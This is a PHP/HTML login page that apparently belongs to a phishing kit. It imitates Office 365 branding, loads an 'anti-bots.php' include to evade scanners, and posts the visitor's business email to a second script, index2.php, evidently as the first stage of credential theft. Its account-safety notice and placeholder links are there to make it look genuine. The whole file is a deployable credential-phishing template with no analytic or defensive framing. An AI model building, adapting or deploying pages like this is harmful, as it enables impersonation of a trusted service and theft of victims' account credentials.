<?php
require 'anti-bots.php';
?>
<html><head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta content="width=device-width" name="viewport">
        <link href="img/o365.png" rel="shortcut icon" type="image/x-icon">
        <title>
           Office 365 Business Interface
        </title>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <link rel="stylesheet" media="screen" href="root/rui-core.min.css">
        <link rel="stylesheet" media="screen" href="root/rui-forms-all.min.css">
           </head>
    <body data-gr-c-s-loaded="true">
        
        <div id="wrapInfoAndLogin">
            <div class="form-and-links">
                <div class="login-section-container">
				
                    <div class="login-section">
					<center><img src="img/loop.png" width="180px" height="100px"></center>
                        <h1>Business Reporting Interface</h1>
                        <p>Use your business account to log in.</p>
                        <div class="login-notice">
                            <div class="hidden box rui-message rui-info" id="no_cookies"></div>     
                        </div>
                        <div class="input-panel">
                            <form class="new_cp_user" id="new_cp_user" action="index2.php" accept-charset="UTF-8" method="post">
                                <div class="username-area">
                                    <input placeholder="Business Email" class="rui-input" tabindex="1" type="email" name="email" id="cp_user_email" required="" autofocus="" required="">
                                </div>
								<p class="click-link-info">
                                                                     </p>
                                <p class="click-link-info">
Office 365 recommends the use of a personal device to access this content!


                                </p><div class="submit-area">
                                    <!--[if IE]>
                                        <input class="hidden-button" type="submit" />
                                    <![endif]-->
                                    <input style="cursor:pointer;" type="submit" name="commit" value="Sign In" class="rui-button-brand" tabindex="3">
                                </div>
                            </form>
                        </div>
                        <div class="forgot-password">
                            <a href="#" tabindex="-1">Forgot your password?</a>
                        </div>
                        <div class="links-mobile">
                            <ul>
                                <li>
                                    <a href="#" tabindex="-1" title="About Us">About Us</a>
                                </li>
                                <li>
                                    <a href="#" tabindex="-1" title="Contact">Contact</a>
                                </li>
                                <li>
                                    <a href="#" tabindex="-1" title="Support">Support</a>
                                </li>
                                <li>
                                    <a href="#" tabindex="-1" title="Account Safety">Account Safety</a>
                                </li>
                            </ul>
                        </div>
                        <p class="breach-info-mobile">
                            It is a breach of our terms and conditions to provide username and password details to unauthorised third parties. Unauthorised use may lead to suspension or termination. See
                            <a href="#" tabindex="-1" title="Privacy">Privacy</a>
                            and
                            <a href="#" tabindex="-1" title="Legal">Legal.</a>
                        </p>
                    </div>
                </div>
                <div class="links-container">
                    <div class="links">
                        <ul>
                            <li>
                                <a href="#" tabindex="-1" title="About Us">About Us</a>
                            </li>
                            <li>
                                <a href="#" tabindex="-1" title="Contact">Contact</a>
                            </li>
                            <li>
                                <a href="#" tabindex="-1" title="Support">Support</a>
                            </li>
                            <li>
                                <a href="#" tabindex="-1" title="Account Safety">Account Safety</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="footer">
                <div class="breach-info">
                    <p>
                        It is a breach of our terms and conditions to provide username and password details to unauthorized third parties. Unauthorized use may lead to suspension or termination. See
                        <a href="#" tabindex="-1" title="Privacy">Privacy</a>
                        and
                        <a href="#" tabindex="-1" title="Legal">Legal.</a>
                    </p>
                </div>
            </div>
        </div>
        <div id="footerBg"></div>  
        <script type="text/javascript">
            
            document.addEventListener("DOMContentLoaded", function(event) {
   document.querySelectorAll('img').forEach(function(img){
  	img.onerror = function(){this.style.display='none';};
   })
});
        </script>

</body></html>
